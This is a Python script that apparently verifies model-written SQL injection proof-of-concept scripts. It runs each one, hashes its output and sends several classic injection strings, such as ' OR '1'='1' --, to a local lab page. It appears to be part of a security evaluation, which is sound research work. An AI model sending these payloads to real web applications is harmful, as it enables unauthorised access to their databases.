import subprocess,sys,json,hashlib,os,datetime,re,urllib.request,urllib.parse
from pathlib import Path
src=Path('evidence/S001_poc_actual_2026-10-26');out=Path('evidence/S001_poc_verified_2026-10-26');out.mkdir(exist_ok=True)
rows=[];env=dict(os.environ);env.update(PYTHONIOENCODING='utf-8',NO_PROXY='127.0.0.1,localhost',no_proxy='127.0.0.1,localhost')
for d in sorted(src.glob('INJ_SQLI_*')):
 dest=out/d.name;dest.mkdir(exist_ok=True);code=(d/'model_poc.py').read_bytes();(dest/'model_poc.py').write_bytes(code)
 started=datetime.datetime.now(datetime.timezone.utc).isoformat()
 r=subprocess.run([sys.executable,str(dest/'model_poc.py')],env=env,capture_output=True,timeout=40)
 (dest/'stdout.txt').write_bytes(r.stdout);(dest/'stderr.txt').write_bytes(r.stderr)
 row={'run_id':d.name,'started_at_utc':started,'exit_code':r.returncode,'script_sha256':hashlib.sha256(code).hexdigest(),'source_script':str(d/'model_poc.py'),'stdout_sha256':hashlib.sha256(r.stdout).hexdigest(),'stderr_sha256':hashlib.sha256(r.stderr).hexdigest(),'execution_attempted':True,'environment_override':'NO_PROXY=127.0.0.1,localhost; model script unchanged','trigger_assessment':'pending_output_review'}
 rows.append(row);print(d.name,r.returncode,r.stdout.decode('utf8','replace'),r.stderr.decode('utf8','replace'))
(out/'execution_summary.json').write_text(json.dumps(rows,ensure_ascii=False,indent=2)+'\n',encoding='utf8')
op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
for label,value in [('normal','Alice'),('true',"Alice' AND '1'='1"),('false',"Alice' AND '1'='2"),('or',"' OR '1'='1"),('comment',"' OR '1'='1' -- ")]:
 u='http://127.0.0.1:4280/lab_cases/S001/index.php?'+urllib.parse.urlencode({'name':value})
 with op.open(u,timeout=10) as resp:body=resp.read();status=resp.status
 (out/(label+'_response.html')).write_bytes(body)
 (out/(label+'_request.json')).write_text(json.dumps({'url':u,'status':status,'response_sha256':hashlib.sha256(body).hexdigest()},ensure_ascii=False,indent=2)+'\n',encoding='utf8')
